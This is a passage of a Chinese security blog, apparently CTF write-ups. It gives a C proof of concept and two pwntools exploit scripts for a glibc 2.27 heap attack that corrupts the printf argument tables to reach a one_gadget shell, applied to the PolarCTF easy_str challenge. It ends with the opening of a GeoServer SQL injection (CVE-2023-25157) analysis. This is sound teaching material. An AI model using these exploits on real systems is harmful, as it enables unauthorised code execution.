*a[<span class="hljs-number">10</span>];<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// make printf quiet</span><br><br>  <span class="hljs-comment">/* leak libc */</span><br>  a[<span class="hljs-number">0</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* UAF chunk */</span><br>  a[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));<br>  a[<span class="hljs-number">2</span>] = <span class="hljs-built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));<br>  a[<span class="hljs-number">3</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* avoid consolidation */</span><br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">0</span>]);<br>  libc_base = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)a[<span class="hljs-number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"libc @ 0x%lxn"</span>, libc_base);<br><br>  <span class="hljs-comment">/* prepare fake printf arginfo table */</span><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)(a[<span class="hljs-number">2</span>] + (<span class="hljs-string">'X'</span> - <span class="hljs-number">2</span>) * <span class="hljs-number">8</span>) = libc_base + ONE_GADGET;<br>  <span class="hljs-comment">//*(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET;</span><br>    <span class="hljs-comment">//now __printf_arginfo_table['X'] = one_gadget;</span><br><br>  <span class="hljs-comment">/* unsorted bin attack */</span><br>  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)(a[<span class="hljs-number">0</span>] + <span class="hljs-number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="hljs-number">0x10</span>;<br>  a[<span class="hljs-number">0</span>] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>); <span class="hljs-comment">/* overwrite global_max_fast */</span><br><br>  <span class="hljs-comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span><br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">1</span>]);<span class="hljs-comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span><br>  <span class="hljs-built_in">free</span>(a[<span class="hljs-number">2</span>]);<span class="hljs-comment">//__printf_arginfo_table =&gt; one_gadget</span><br><br>  <span class="hljs-comment">/* ignite! */</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%X"</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></tbody></table></figure>
-
-<h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a><strong>动态分析</strong></h2><p>glibc的调试我们用的比较多了，在涉及到库函数的时候最好结合源码进行调试，在<a target="_blank" rel="noopener" href="https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.gz">glibc下载</a>这里下载源码，解压之后使用<code>directory</code>添加源码目录</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">b* 0x400774<br>directory ~/Desktop/CTF/glibc-2.27/stdio-common<br>r<br>parseheap<br></code></pre></td></tr></tbody></table></figure>
-
-<p>在printf下断点，可以看到此时<code>__printf_arginfo_table</code>伪造完成，我们使用<code>rwatch *0x60be50</code>下内存断点，继续运行。</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/aHdqOPVUAIYFCko.png'><img src="https://s2.loli.net/2023/12/10/aHdqOPVUAIYFCko.png" alt="image.png"></p>
-<p>单步进入si进入printf</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/q2yOvaBodYz9HS4.png'><img src="https://s2.loli.net/2023/12/10/q2yOvaBodYz9HS4.png" alt="image.png"></p>
-<p>下一个调用函数</p>
-<p>下一步调用</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/ejzLIE2Ff4RrBtn.png'><img src="https://s2.loli.net/2023/12/10/ejzLIE2Ff4RrBtn.png" alt="image.png"></p>
-<p>可以看到运行到了<code>__parse_one_specmb</code>函数，再跟进两步，发现最终调用了<code>rax</code>寄存器里的 one_gadget</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/xE4kFPsr8IMlOmS.png'><img src="https://s2.loli.net/2023/12/10/xE4kFPsr8IMlOmS.png" alt="image.png"></p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/TyBSJVIYuACgKjG.png'><img src="https://s2.loli.net/2023/12/10/TyBSJVIYuACgKjG.png" alt="image.png"></p>
-<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a><strong>扩展</strong></h2><p>当然，除了覆写第二个table外，改第一个一样可以get shell，流程和调试我们已经讲的差不多了，这里只需把one_gadget赋值代码改为<code>*(unsigned long*)(a[1] + ('X' - 2) * 8) = libc_base + ONE_GADGET;</code>即可，我们用同样方式在gdb下调试poc并设置硬件断点</p>
-<p>continue继续，可以看到在<code>printf_positional</code>断住，跟进两步，最终调用了<code>rax</code>里的`one_gadget</p>
-<h2 id="例题-PolarCTF2023-冬季个人挑战赛-easy-str"><a href="#例题-PolarCTF2023-冬季个人挑战赛-easy-str" class="headerlink" title="例题: PolarCTF2023 冬季个人挑战赛 easy_str"></a>例题: PolarCTF2023 冬季个人挑战赛 easy_str</h2><h2 id="查看题目信息"><a href="#查看题目信息" class="headerlink" title="查看题目信息**"></a>查看题目信息**</h2><figure class="highlight arcade"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$file</span> easy_str<span class="hljs-symbol">$c</span>hecksec easy_str<br></code></pre></td></tr></tbody></table></figure>
-
-
-
-<p>利用 <code>unsorted bin attack</code> 将 <code>global_max_fast</code> 改为 <code>main_arena-&gt;top</code>，后面释放的 <code>chunk</code> 会进入 <code>fastbinY</code> 数组。通过 <code>fastbinY</code> 越界利用将<code>__printf_arginfo_table</code> 对应的 <code>spec</code> 改为 <code>one_gadget</code>。最后通过调用 <code>printf("%X",0)</code> 来触发 <code>one_gadget</code>：</p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_shell</span>():    <br>	edit(<span class="hljs-number">0</span>, p64(libc_addr+<span class="hljs-number">0x3ed940</span>-<span class="hljs-number">0x10</span>)*<span class="hljs-number">2</span>)    <br>	edit(<span class="hljs-number">2</span>, <span class="hljs-string">b'a'</span>*((<span class="hljs-number">0x58</span>-<span class="hljs-number">2</span>)*<span class="hljs-number">8</span>) + p64(libc_addr+<span class="hljs-number">0x10a2fc</span>))    <br>	add(<span class="hljs-number">0x500</span>) <span class="hljs-comment"># 4    </span><br>	dele(<span class="hljs-number">2</span>)    <br>	dele(<span class="hljs-number">1</span>)<br></code></pre></td></tr></tbody></table></figure>
-
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP**"></a>EXP**</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#pwn()</span><br><br><span class="hljs-comment">#远程</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.terminal = [<span class="hljs-string">'tmux'</span>, <span class="hljs-string">'splitw'</span>, <span class="hljs-string">'-h'</span>]<br>context.binary = <span class="hljs-string">'./easy_str.easy_str'</span><br>context.log_level = <span class="hljs-string">'debug'</span><br><br><span class="hljs-comment"># io = remote('120.46.59.242', 2131)</span><br>io = process(<span class="hljs-string">'./easy_str.easy_str'</span>)<br>elf = ELF(<span class="hljs-string">'./easy_str.easy_str'</span>)<br>libc = ELF(<span class="hljs-string">'./libc-2.27.so'</span>)<br>one_gadgets = [<span class="hljs-number">0x4f2a5</span>, <span class="hljs-number">0x4f302</span>, <span class="hljs-number">0x10a2fc</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">gdbscript=<span class="hljs-string">""</span>, stop=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(io, process):<br>        gdb.attach(io, gdbscript=gdbscript)<br>        <span class="hljs-keyword">if</span> stop:<br>            pause()<br><br>stop = pause<br>S = pause<br>leak = <span class="hljs-keyword">lambda</span> name, address: log.info(<span class="hljs-string">"&#123;&#125; ===&gt; &#123;&#125;"</span>.<span class="hljs-built_in">format</span>(name, <span class="hljs-built_in">hex</span>(address)))<br>s   = io.send<br>sl  = io.sendline<br>sla = io.sendlineafter<br>sa  = io.sendafter<br>slt = io.sendlinethen<br>st  = io.sendthen<br>r   = io.recv<br>rn  = io.recvn<br>rr  = io.recvregex<br>ru  = io.recvuntil<br>ra  = io.recvall<br>rl  = io.recvline<br>rs  = io.recvlines<br>rls = io.recvline_startswith<br>rle = io.recvline_endswith<br>rlc = io.recvline_contains<br>ia  = io.interactive<br>ic  = io.close<br>cr  = io.can_recv<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">i</span>):<br>    sla(<span class="hljs-string">b'choice: \\n'</span>, i)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    cmd(<span class="hljs-string">b'1'</span>)<br>    sla(<span class="hljs-string">b'size:\\n'</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    cmd(<span class="hljs-string">b'2'</span>)<br>    sla(<span class="hljs-string">b'id:\\n'</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    sl(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-string">b'3'</span>)<br>    sla(<span class="hljs-string">b'id:\\n'</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    ru(<span class="hljs-string">b'output\\n'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-string">b'4'</span>)<br>    sla(<span class="hljs-string">b'id:\\n'</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_libc</span>():<br>    <span class="hljs-keyword">global</span> libc_addr<br>    add(<span class="hljs-number">0x500</span>)  <span class="hljs-comment"># 0</span><br>    add(<span class="hljs-number">0x4af8</span>*<span class="hljs-number">2</span>-<span class="hljs-number">0x10</span>) <span class="hljs-comment"># 1</span><br>    add(<span class="hljs-number">0xC30</span>*<span class="hljs-number">2</span>-<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># 2</span><br>    add(<span class="hljs-number">0x500</span>)  <span class="hljs-comment"># 3</span><br><br>    dele(<span class="hljs-number">0</span>)<br>    show(<span class="hljs-number">0</span>)<br><br>    libc_addr = u64(r(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">0x8</span>, <span class="hljs-string">b'\\x00'</span>))-<span class="hljs-number">0x3ebca0</span><br>    leak(<span class="hljs-string">"libc_addr"</span>, libc_addr)<br>    leak(<span class="hljs-string">"onegadget"</span>, libc_addr+<span class="hljs-number">0x10a2fc</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_shell</span>():<br>    edit(<span class="hljs-number">0</span>, p64(libc_addr+<span class="hljs-number">0x3ed940</span>-<span class="hljs-number">0x10</span>)*<span class="hljs-number">2</span>)<br>    edit(<span class="hljs-number">2</span>, <span class="hljs-string">b'a'</span>*((<span class="hljs-number">0x58</span>-<span class="hljs-number">2</span>)*<span class="hljs-number">8</span>) + p64(libc_addr+<span class="hljs-number">0x10a2fc</span>)) <span class="hljs-comment">#这里打2打1都可以</span><br>    add(<span class="hljs-number">0x500</span>) <span class="hljs-comment"># 4</span><br>    dele(<span class="hljs-number">2</span>)<br>    dele(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    get_libc()<br>    get_shell()<br>    ia()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    pwn()<br></code></pre></td></tr></tbody></table></figure>
-
-<p>打本地，我的libc版本是<strong>2.27-3ubuntu1_amd64</strong></p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level = <span class="hljs-string">"debug"</span>,arch = <span class="hljs-string">"amd64"</span>)<br>file_name=<span class="hljs-string">'./easy_str.easy_str'</span><br>ld_name=<span class="hljs-string">'/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so'</span><br><span class="hljs-comment"># libc_name='/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6'</span><br>libc_name = <span class="hljs-string">'./libc-2.27.so'</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> p,elf,libc<br>    local = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> local:<br>        <span class="hljs-comment"># p = process([ld_name, file_name], env=&#123;"LD_PRELOAD":libc_name&#125;)</span><br>        p = process(file_name)<br>    <span class="hljs-keyword">else</span>:<br>        p = remote(<span class="hljs-string">"120.46.59.242"</span>,<span class="hljs-number">2131</span> )<br>    elf = ELF(file_name)<br>    <span class="hljs-comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br>    libc = ELF(<span class="hljs-string">"/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so"</span>)<br>    <span class="hljs-comment"># libc = ELF(libc_name)</span><br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sa      = <span class="hljs-keyword">lambda</span> x,data             :p.sendafter(x, data)<br>sla     = <span class="hljs-keyword">lambda</span> x,data             :p.sendlineafter(x, data)<br>r       = <span class="hljs-keyword">lambda</span> n                  :p.recv(n)<br>rl      = <span class="hljs-keyword">lambda</span> n                  :p.recvline(n)<br>ru      = <span class="hljs-keyword">lambda</span> x                  :p.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>r       = <span class="hljs-keyword">lambda</span> x                  :p.recv(x)<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(p.recvuntil(<span class="hljs-string">b'\\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\\x00'</span>))<br>itr     = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">'&#123;&#125; = &#123;:#x&#125;'</span>.<span class="hljs-built_in">format</span>(name, addr))<br>lg      = <span class="hljs-keyword">lambda</span> address,data       :log.success(<span class="hljs-string">'%s: '</span>%(address)+<span class="hljs-built_in">hex</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">addr</span>):<br>    gdb.attach(sh,<span class="hljs-string">'b *0x&#123;&#125;\\nc\\n'</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    gdb.attach(p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">meau</span>(<span class="hljs-params">idx</span>):<br>    ru(<span class="hljs-string">"choice: \\n"</span>)<br>    sl(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    meau(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">"id:\\n"</span>,<span class="hljs-built_in">str</span>(idx))<br>    s(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    meau(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">"size:\\n"</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    meau(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">"id:"</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    meau(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">"id:"</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment">#define offset2size(ofs) ((ofs) * 2 - 0x10)</span><br>MAIN_ARENA       = <span class="hljs-number">0x3ebc40</span><br>MAIN_ARENA_DELTA = <span class="hljs-number">0x60</span><br>GLOBAL_MAX_FAST  = <span class="hljs-number">0x3ed940</span><br>PRINTF_FUNCTABLE = <span class="hljs-number">0x3f0658</span><br>PRINTF_ARGINFO   = <span class="hljs-number">0x3ec870</span><br>ONE_GADGET       = <span class="hljs-number">0x10a38c</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#0</span><br>    add((PRINTF_FUNCTABLE-MAIN_ARENA)*<span class="hljs-number">2</span>-<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span><br>    add((PRINTF_ARGINFO-MAIN_ARENA)*<span class="hljs-number">2</span>-<span class="hljs-number">0x10</span>)   <span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#3</span><br><br>    delete(<span class="hljs-number">0</span>)<br>    show(<span class="hljs-number">0</span>)<br>    ru(<span class="hljs-string">"output\\n"</span>)<br><br>    libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\\x00'</span>)) - MAIN_ARENA - MAIN_ARENA_DELTA<br>    lg(<span class="hljs-string">"libc_base"</span>,libc_base)<br><br>    pay0 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">86</span> + p64(libc_base+ONE_GADGET)<br>    edit(<span class="hljs-number">2</span>,pay0)<br><br>    <span class="hljs-comment">#修改global_max_fast</span><br>    pay1 = p64(<span class="hljs-number">0</span>) + p64(libc_base + GLOBAL_MAX_FAST-<span class="hljs-number">0x10</span>)<br>    edit(<span class="hljs-number">0</span>,pay1)<br>    add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#0</span><br><br>    delete(<span class="hljs-number">2</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># meau(666)</span><br>    <span class="hljs-comment"># db()  </span><br>    p.interactive()<br></code></pre></td></tr></tbody></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-        
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://kylinxin.github.io/2023/11/05/GeoServer%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2023-25157%EF%BC%89%2099fa857ab6de4ee5a6af2eb1bee9437c/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/faction/1.png">
-      <meta itemprop="name" content="Kylinxin">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Kylinxin's Blog">
-      <meta itemprop="description" content="Kylinxin's Blog">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Kylinxin's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/11/05/GeoServer%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2023-25157%EF%BC%89%2099fa857ab6de4ee5a6af2eb1bee9437c/" class="post-title-link" itemprop="url">GeoServer SQL 注入漏洞分析（CVE-2023-25157）</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-11-05 15:14:29" itemprop="dateCreated datePublished" datetime="2023-11-05T15:14:29+08:00">2023-11-05</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>3.5k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>13 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="GeoServer-SQL-注入漏洞分析（CVE-2023-25157）"><a href="#GeoServer-SQL-注入漏洞分析（CVE-2023-25157）" class="headerlink" title="GeoServer SQL 注入漏洞分析（CVE-2023-25157）"></a>GeoServer SQL 注入漏洞分析（CVE-2023-25157）</h1><h1 id="一-GeoServer简介"><a href="#一-GeoServer简介" class="headerlink" title="一.GeoServer简介"></a>一.GeoServer简介</h1><p>GeoServer 是用 Java 编写的开源软件服务器，它提供了查看、编辑和共享地理空间数据的功能。它旨在成为一种灵活、高效的解决方案，用于分发来自各种来源（如地理信息系统 （GIS） 数据库、基于 Web 的数据和个人数据集）的地理空间数据。</p>
-<h1 id="二-漏洞简述"><a href="#二-漏洞简述" class="headerlink" title="二.漏洞简述"></a>二.漏洞简述</h1><p>在 2.22.1 和 2.21.4 之前的版本中，在开放地理空间联盟 （OGC） 标准定义的过滤器和函数表达式中发现了一个 SQL 注入问题，未经身份验证的攻击者可以利用该漏洞进行SQL注入，执行恶意代码。</p>
-<h1 id="三-漏洞原理"><a href="#三-漏洞原理" class="headerlink" title="三.漏洞原理"></a>三.漏洞原理</h1><p>由于系统未对用户输入进行过滤，远程未授权攻击者可以构造特定语句绕过GeoServer的词法解析，从而实现SQL注入，成功利用此漏洞可获取敏感信息，甚至可能获取数据库服务器权限。由于GeoServer在默认配置下内置图层存放数据在文件中，则未使用外置数据库的场景不受此漏洞影响。</p>
-<h1 id="四-影响版本"><a href="#四-影响版本" class="headerlink" title="四.影响版本"></a>四.影响版本</h1><p>GeoServer 2.20.x &lt; 2.20.7<br>GeoServer 2.19.x &lt; 2.19.7<br>GeoServer 2.18.x &lt; 2.18.7<br>GeoServer 2.21.x &lt; 2.21.4<br>GeoServer 2.22.x &lt; 2.22.2</p>
-<h1 id="五-环境搭建"><a href="#五-环境搭建" class="headerlink" title="五.环境搭建"></a>五.环境搭建</h1><p>在kali的docker中搭建vulhub进行漏洞复现</p>
-<p>clone项目：</p>
-<blockquote>
-<p>sudo git clone <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub.git">https://github.com/vulhub/vulhub.git</a></p>
-</blockquote>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/DUJiVs6f8zyXNla.png'><img src="https://s2.loli.net/2023/12/10/DUJiVs6f8zyXNla.png" alt="Untitled 1.png"></p>
-<p>在/geoserver/CVE-2023-25157目录，用下面的命令下载并启动:</p>
-<p>sudo docker-compose up -d</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/w2gab6A5piJHy7L.png'><img src="https://s2.loli.net/2023/12/10/w2gab6A5piJHy7L.png" alt="Untitled 2.png"></p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/eOiZFKUfyXS2v9k.png'><img src="https://s2.loli.net/2023/12/10/eOiZFKUfyXS2v9k.png" alt="Untitled 3.png"></p>
-<p>看到端口，这里是8080。</p>
-<p>在浏览器上访问<a target="_blank" rel="noopener" href="http://your-ip:8080/geoserver">http://your-ip:8080/geoserver</a></p>
-<p>进入环境，说明配置成功了，接下来就可以开始愉快的漏洞复现了：</p>
-<p class='item-img' data-src='https://s2.loli.net/2023/12/10/UhPelsNOky8SYCV.png'><img src="https://s2.loli.net/2023/12/10/UhPelsNOky8SYCV.png" alt="Untitled 4.png"></p>
